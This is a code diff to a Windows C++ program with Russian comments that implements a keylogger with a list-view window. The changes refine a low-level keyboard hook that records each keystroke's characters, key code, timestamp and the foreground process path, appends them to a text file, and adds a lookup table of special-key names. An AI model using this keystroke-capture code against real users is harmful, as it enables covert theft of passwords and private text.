@@ -134,6 +134,7 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
             KeyloggerFilling(hwndListView);
             break;
         case OnClearedList:
+            keyloggerRecords.clear();
             ListView_DeleteAllItems(hwndListView);
             break;
         case OnRecordAction:
@@ -283,8 +284,8 @@ void KeyloggerFilling(HWND hwndListView) {
         ListView_SetItemText(hwndListView, lvItem.iItem, 3, const_cast<LPWSTR>(keyCodeText.c_str()));
 
         // 5. Символ клавиши (столбец 4)
-        std::wstring keyCharText(1, record.keyChar);
-        ListView_SetItemText(hwndListView, lvItem.iItem, 4, const_cast<LPWSTR>(keyCharText.c_str()));
+        //std::wstring keyCharText(1, record.keyChar);
+        ListView_SetItemText(hwndListView, lvItem.iItem, 4, const_cast<LPWSTR>(record.keyChar.c_str()));
     }
 }
 
@@ -443,30 +444,161 @@ void CreateFileInSelectedFolder(HWND hwnd) {
     }
 }
 
-
-
 // Функция-словарь для обработки специальных клавиш
 wstring GetKeyStringFromCode(int keyCode) {
     switch (keyCode) {
-    case VK_RETURN: return L"ENTER";      // Enter
-    case VK_BACK: return L"BACKSPACE";    // Backspace
-    case VK_TAB: return L"TAB";           // Tab
-    case VK_SPACE: return L"SPACE";       // Space
-    case VK_SHIFT: return L"SHIFT";       // Shift
-    case VK_CONTROL: return L"CONTROL";   // Control
-    case VK_MENU: return L"ALT";          // Alt
-    case VK_ESCAPE: return L"ESCAPE";     // Escape
-    case VK_CAPITAL: return L"CAPS LOCK"; // Caps Lock
-    case VK_LSHIFT: return L"LEFT SHIFT"; // Left Shift
-    case VK_RSHIFT: return L"RIGHT SHIFT"; // Right Shift
-    case VK_LCONTROL: return L"LEFT CONTROL"; // Left Control
-    case VK_RCONTROL: return L"RIGHT CONTROL"; // Right Control
-    case VK_LMENU: return L"LEFT ALT";    // Left Alt
-    case VK_RMENU: return L"RIGHT ALT";   // Right Alt
-    default: return L"";                  // Если клавиша не имеет отображаемого текста
+
+    // Управляющие клавиши
+    case VK_RETURN:     return L"ENTER";         // Enter
+    case VK_BACK:       return L"BACKSPACE";     // Backspace
+    case VK_TAB:        return L"TAB";           // Tab
+    case VK_SPACE:      return L"SPACE";         // Space
+    case VK_SHIFT:      return L"SHIFT";         // Shift
+    case VK_CONTROL:    return L"CTRL";          // Control
+    case VK_MENU:       return L"ALT";           // Alt
+    case VK_ESCAPE:     return L"ESC";           // Escape
+    case VK_CAPITAL:    return L"CAPS LOCK";     // Caps Lock
+    case VK_LSHIFT:     return L"LEFT SHIFT";    // Left Shift
+    case VK_RSHIFT:     return L"RIGHT SHIFT";   // Right Shift
+    case VK_LCONTROL:   return L"LEFT CTRL";     // Left Control
+    case VK_RCONTROL:   return L"RIGHT CTRL";    // Right Control
+    case VK_LMENU:      return L"LEFT ALT";      // Left Alt
+    case VK_RMENU:      return L"RIGHT ALT";     // Right Alt
+
+    // Функциональные клавиши
+    case VK_F1:  return L"F1";
+    case VK_F2:  return L"F2";
+    case VK_F3:  return L"F3";
+    case VK_F4:  return L"F4";
+    case VK_F5:  return L"F5";
+    case VK_F6:  return L"F6";
+    case VK_F7:  return L"F7";
+    case VK_F8:  return L"F8";
+    case VK_F9:  return L"F9";
+    case VK_F10: return L"F10";
+    case VK_F11: return L"F11";
+    case VK_F12: return L"F12";
+    case VK_SCROLL: return L"SCROLL LK";
+
+    // Символы на цифровой клавиатуре
+    case VK_NUMLOCK: return L"NUM LOCK";
+    case VK_NUMPAD0: return L"NUMPAD 0";
+    case VK_NUMPAD1: return L"NUMPAD 1";
+    case VK_NUMPAD2: return L"NUMPAD 2";
+    case VK_NUMPAD3: return L"NUMPAD 3";
+    case VK_NUMPAD4: return L"NUMPAD 4";
+    case VK_NUMPAD5: return L"NUMPAD 5";
+    case VK_NUMPAD6: return L"NUMPAD 6";
+    case VK_NUMPAD7: return L"NUMPAD 7";
+    case VK_NUMPAD8: return L"NUMPAD 8";
+    case VK_NUMPAD9: return L"NUMPAD 9";
+
+    // Специальные клавиши из блока
+    case VK_PRIOR:     return L"PAGE UP";        // Page Up
+    case VK_NEXT:      return L"PAGE DOWN";      // Page Down
+    case VK_END:       return L"END";            // End
+    case VK_HOME:      return L"HOME";           // Home
+    case VK_LEFT:      return L"LEFT ARROW";     // Left Arrow
+    case VK_UP:        return L"UP ARROW";       // Up Arrow
+    case VK_RIGHT:     return L"RIGHT ARROW";    // Right Arrow
+    case VK_DOWN:      return L"DOWN ARROW";     // Down Arrow
+    case VK_SELECT:    return L"SELECT";         // Select
+    case VK_PRINT:     return L"PRINT";          // Print
+    case VK_EXECUTE:   return L"EXECUTE";        // Execute
+    case VK_SNAPSHOT:  return L"PRINT SCREEN";   // Print Screen
+    case VK_INSERT:    return L"INSERT";         // Insert
+    case VK_DELETE:    return L"DELETE";         // Delete
+    case VK_HELP:      return L"HELP";           // Help
+
+    // Символы на клавиатуре
+    case VK_OEM_PLUS:   return L"PLUS";          // +
+    case VK_OEM_MINUS:  return L"MINUS";         // -
+    case VK_OEM_COMMA:  return L"COMMA";         // ,
+    case VK_OEM_PERIOD: return L"DOT";           // .
+
+    default: return L"UNKNOWN";                         // Неизвестная клавиша
     }
 }
 
+/*
+// Процедура обработки хука клавиатуры
+LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode == HC_ACTION) {
+        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
+
+        // Обрабатываем только нажатие клавиш
+        if (wParam == WM_KEYDOWN) {
+            DWORD processId;
+            GetWindowThreadProcessId(GetForegroundWindow(), &processId);
+
+            // Получаем путь к процессу
+            wchar_t processPath[MAX_PATH];
+            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
+            if (hProcess) {
+                DWORD pathLength = GetModuleFileNameExW(hProcess, NULL, processPath, MAX_PATH);
+                CloseHandle(hProcess);
+            }
+
+            // Получаем текущее время
+            time_t currentTime = time(NULL);
+            tm timeInfo;
+            localtime_s(&timeInfo, &currentTime);  // Используем localtime_s
+
+            wchar_t dateTime[120];
+            wcsftime(dateTime, sizeof(dateTime), L"%Y-%m-%d %H:%M:%S", &timeInfo);
+
+            // Получаем состояние клавиатуры
+            BYTE keyboardState[256];
+            GetKeyboardState(keyboardState);  // Состояние клавиш (например, Shift, CapsLock, etc.)
+
+            // Буфер для символов
+            WCHAR szBuffer[20] = L"";
+            int nChar = ToUnicode(pKeyboard->vkCode, pKeyboard->scanCode, keyboardState, szBuffer, 20, 0);
+
+            // Создаем запись
+            KeyloggerRecord record;
+            record.processId = processId;
+            record.processPath = processPath;
+            record.dateTime = dateTime;
+            record.keyCode = pKeyboard->vkCode;
+
+            // Если символ был получен
+            if (nChar > 0) {
+                record.keyChar = std::wstring(szBuffer, nChar);  // Преобразуем символы в строку
+            }
+            // Если символ не был получен, проверяем на специальные клавиши
+            else {
+                record.keyChar = GetKeyStringFromCode(pKeyboard->vkCode);  // Получаем строку для специальных клавиш
+                if (record.keyChar.empty()) {
+                    record.keyChar = L"UNKNOWN";  // Устанавливаем значение по умолчанию для неизвестных клавиш
+                }
+            }
+
+            // Записываем в файл только если путь был выбран
+            if (globalFilePath[0] != 0) {  // Если путь не пуст
+                //std::wofstream outFile(globalFilePath, std::ios::app);
+                std::wofstream outFile(L"keylogger_output.txt", std::ios::app);
+                if (outFile.is_open()) {
+                    outFile << record.processId << L";"
+                        << record.processPath << L";"
+                        << record.dateTime << L";"
+                        << record.keyCode << L";"
+                        << record.keyChar << std::endl;
+                    outFile.close();
+                }
+            }
+
+            // Добавляем запись в список (если нужно)
+            keyloggerRecords.push_back(record);
+
+        }
+    }
+
+    KeyloggerFilling(hwndListView);
+
+    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
+}
+*/
 
 // Процедура обработки хука клавиатуры
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
@@ -499,8 +631,8 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             GetKeyboardState(keyboardState);  // Состояние клавиш (например, Shift, CapsLock, etc.)
 
             // Буфер для символов
-            WCHAR szBuffer[10];
-            int nChar = ToUnicode(pKeyboard->vkCode, pKeyboard->scanCode, keyboardState, szBuffer, 10, 0);
+            WCHAR szBuffer[20] = L"";
+            int nChar = ToUnicode(pKeyboard->vkCode, pKeyboard->scanCode, keyboardState, szBuffer, 20, 0);
 
             // Создаем запись
             KeyloggerRecord record;
@@ -509,16 +641,33 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             record.dateTime = dateTime;
             record.keyCode = pKeyboard->vkCode;
 
+            // Карта для отображения специальных клавиш
+            static const std::unordered_map<int, std::wstring> specialKeys = {
+                {VK_BACK, L"BACKSPACE"},
+                {VK_TAB, L"TAB"},
+                {VK_RETURN, L"ENTER"},
+                {VK_ESCAPE, L"ESC"},
+                {VK_SPACE, L"SPACE"}
+            };
 
             // Если символ был получен
             if (nChar > 0) {
-                record.keyChar = szBuffer[0];  // Символ клавиши
+                record.keyChar = std::wstring(szBuffer, nChar);  // Преобразуем символы в строку
+
+                // Если это специальная клавиша, заменяем на соответствующее имя
+                auto it = specialKeys.find(pKeyboard->vkCode);
+                if (it != specialKeys.end()) {
+                    record.keyChar = it->second;  // Заменяем на строку для специальной клавиши
+                }
             }
-            // Если символ не был получен, проверяем на специальные клавиши
+            // Если символ не был получен (специальная клавиша), то используем GetKeyStringFromCode
             else {
-                std::wstring keyString = GetKeyStringFromCode(pKeyboard->vkCode);
-                record.keyChar = keyString.empty() ? 0 : keyString[0];  // Если строка не пуста, берем первый символ
+                record.keyChar = GetKeyStringFromCode(pKeyboard->vkCode);  // Получаем строку для специальных клавиш
+                if (record.keyChar.empty()) {
+                    record.keyChar = L"UNKNOWN";  // Устанавливаем значение по умолчанию для неизвестных клавиш
+                }
             }
+
 
             // Записываем в файл только если путь был выбран
             if (globalFilePath[0] != 0) {  // Если путь не пуст
@@ -544,7 +693,6 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
     return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
 }
-
 
 
 // Установка хука
